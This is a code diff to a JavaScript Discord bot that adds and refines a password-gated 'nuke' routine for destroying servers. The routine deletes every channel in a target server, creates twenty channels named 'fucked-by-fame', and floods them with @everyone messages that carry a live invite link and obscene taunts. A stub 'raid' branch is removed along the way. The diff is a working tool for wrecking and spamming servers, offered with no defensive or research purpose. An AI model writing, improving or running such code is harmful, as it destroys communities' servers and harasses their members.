@@ -78,7 +78,7 @@ client.on('interactionCreate', async interaction => {
 
     if (action !== 'check') return;
 
-    // 1. Start Button → Password
+    // Start Button
     if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
       const modal = new ModalBuilder()
         .setCustomId(`check_modal_${interaction.user.id}`)
@@ -89,7 +89,7 @@ client.on('interactionCreate', async interaction => {
       return await interaction.showModal(modal);
     }
 
-    // 2. Password Modal
+    // Password Modal
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== MAIN_PASSWORD) {
@@ -117,10 +117,9 @@ client.on('interactionCreate', async interaction => {
       userSessions.set(interaction.user.id, {});
     }
 
-    // 3. Server Select
+    // Server Select
     if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
       await interaction.deferUpdate();
-
       const guildId = interaction.values[0];
       const guild = client.guilds.cache.get(guildId);
       if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
@@ -141,35 +140,20 @@ client.on('interactionCreate', async interaction => {
       });
     }
 
-    // 4. Action Select (Fixed - No defer when showing modal)
+    // Action Select
     if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
-      const choice = interaction.values[0];
-      const session = userSessions.get(interaction.user.id);
-
-      if (choice === 'nuke') {
+      if (interaction.values[0] === 'nuke') {
         const modal = new ModalBuilder()
           .setCustomId(`check_nuke_modal_${interaction.user.id}`)
           .setTitle('Confirm Nuke');
-
         modal.addComponents(new ActionRowBuilder().addComponents(
-          new TextInputBuilder()
-            .setCustomId('password')
-            .setLabel('Nuke Password')
-            .setStyle(TextInputStyle.Short)
-            .setRequired(true)
+          new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
         ));
-
         return await interaction.showModal(modal);
-      }
-
-      // For Raid (if you want to keep it)
-      if (choice === 'raid') {
-        await interaction.deferUpdate();
-        // Raid logic here if needed
       }
     }
 
-    // ==================== NUKE (Stable) ====================
+    // ==================== NUKE - FIXED (No followUp after deletion) ====================
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== NUKE_PASSWORD) {
@@ -187,17 +171,14 @@ client.on('interactionCreate', async interaction => {
       const delay = ms => new Promise(r => setTimeout(r, ms));
 
       try {
-        // Delete
-        await interaction.followUp({ content: '🗑️ Deleting all channels...', flags: MessageFlags.Ephemeral });
-        for (const ch of guild.channels.cache.values()) {
-          await ch.delete().catch(() => {});
+        // Delete all channels
+        for (const channel of guild.channels.cache.values()) {
+          await channel.delete().catch(() => {});
           await delay(400);
         }
 
-        // Create
-        await interaction.followUp({ content: '🔨 Creating fucked-by-fame channels...', flags: MessageFlags.Ephemeral });
+        // Create channels
         const created = [];
-
         for (let i = 0; i < 20; i++) {
           try {
             const chan = await guild.channels.create({
@@ -211,25 +192,24 @@ client.on('interactionCreate', async interaction => {
         }
 
         // Spam
-        await interaction.followUp({ content: `💥 Spamming @everyone + invite...`, flags: MessageFlags.Ephemeral });
         const invite = 'https://discord.gg/NANQMy3WnD';
         const spam = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
 
-        for (const ch of created) {
+        for (const channel of created) {
           for (let i = 0; i < 10; i++) {
-            ch.send(spam).catch(() => {});
+            channel.send(spam).catch(() => {});
             if (i % 3 === 0) await delay(500);
           }
         }
 
-        await interaction.followUp({ 
-          content: `✅ **NUKE COMPLETE**\nCreated **${created.length}** \`fucked-by-fame\` channels`,
-          flags: MessageFlags.Ephemeral 
+        // Final message using editReply (safest)
+        await interaction.editReply({ 
+          content: `✅ **NUKE COMPLETE**\nCreated **${created.length}** channels named \`fucked-by-fame\`\nSpamming @everyone + invite link` 
         });
 
       } catch (err) {
         console.error(err);
-        await interaction.followUp({ content: '⚠️ Nuke partially failed.', flags: MessageFlags.Ephemeral });
+        await interaction.editReply({ content: '⚠️ Nuke partially failed.' });
       }
 
       userSessions.delete(interaction.user.id);
